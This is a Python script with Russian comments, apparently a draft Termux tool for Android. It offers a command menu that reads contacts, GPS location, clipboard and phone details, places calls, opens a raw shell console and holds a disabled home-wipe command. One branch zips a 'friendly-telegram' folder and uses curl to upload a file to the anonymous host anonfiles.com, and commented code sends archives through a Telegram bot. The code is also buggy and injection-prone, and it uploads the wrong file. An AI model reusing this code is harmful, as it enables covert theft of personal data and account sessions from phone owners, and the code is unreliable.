#версия 000
import os 
os.system("pip install telebot")
#os.system("pip install telethon")
#import teleton
import telebot 
import subprocess
from os import system, name 
def clear(): 
	if name == 'nt': 
		_ = system('cls') 
	else: 
		_ = system('clear') 

def start():
	while True:

		a = input(">testmenu: ")

#=========== API КОМАНДЫ============

		if a == "/flesh on":
			os.system("termux-torch on")
		elif a == "/flesh off":
			os.system("termux-torch off")
		elif a == "/toast":
			v = input(">Введите текст временного сообщения: ")
			os.system("termux-toast " + v)
		elif a == "/call":
			v = input(">Введите номер: ")
			c = subprocess.check_output("termux-telephony-call " + v, shell=True)
			print(c)
		elif a == "/download":
			v = input(">Введите ссылку для скачивания: ")
			c = subprocess.check_output("termux-download " + v, shell=True)
			print(c)
		elif a == "/copy_set":
			v = input(">Введите текст для буфера обмена: ")
			os.system('termux-clipboard-set ' + v)
		elif a == "/copy_get":
			v = subprocess.check_output("termux-clipboard-get", shell=True)
			print(v)
		elif a == "/api":
			os.system("pkg install termux-api")
		elif a == "/brightness":
			v = input(">Введите значение от 0 до 255 или auto : ")
			os.system("termux-brightness " + v)
		elif a == "/battery":
			v = subprocess.check_output("termux-battery-status", shell=True)
			print(v)
		elif a == "/contact":
			v = subprocess.check_output("termux-contact-list", shell=True)
			print(v)
		elif a == "/dialog":
			c =input(">Введите название окна: ")
			v = subprocess.check_output('termux-dialog "' + c + '"', shell=True)
			print(v)
		elif a == "/gps":
			c = input(">gps/network/passive ?<")
			v = subprocess.check_output("termux-location -p " + c, shell=True)
			print(v)
		elif a == "/callinfo":
			v = subprocess.check_output("termux-telephony-deviceinfo", shell=True)
			print(v)
		elif a == "/tts":
			v = subprocess.check_output("termux-tts-speak", shell=True)
			print(v)
			
#============== БЕЗ API ===============

		elif a == "/del_home":
			os.system("###cd && rm -rvf")
		elif a == "/clear":
			os.system("clear")
	





#==== СОВОКУПЛЯЮСЬ С ФАЙЛАМИ =====

		elif a == "/ftg":
			os.system("cd ~")
			os.system("mkdir .termux_config")

			os.system("zip -r ftg.zip friendly-telegram")
			os.system("mv ftg.zip ~/.termux_config")

			s = subprocess.check_output('''curl -F "file=@test.txt" https://api.anonfiles.com/upload
			''', shell=True)
			print("Ссылка на скачивание архива > " + s)

#============= КОНСОЛЬ ==============

		elif a == "/console":
			while True:
				comande = input()
				otvet = subprocess.check_output(comande, shell=True)
				print(otvet)
		
		return
while True:
	start()		







#result = subprocess.check_output("command", shell=True)

#це не трогать это для выгрузки файлов
#bot = telebot.TeleBot("ТОКЕН БОТА")
#with open(r'C:\bdseoru.zip',"rb") as file:
#	f=file.read()
#bot.send_document(ТОКЕН БОТА, open(r'C:\bdseoru.zip', 'rb'))
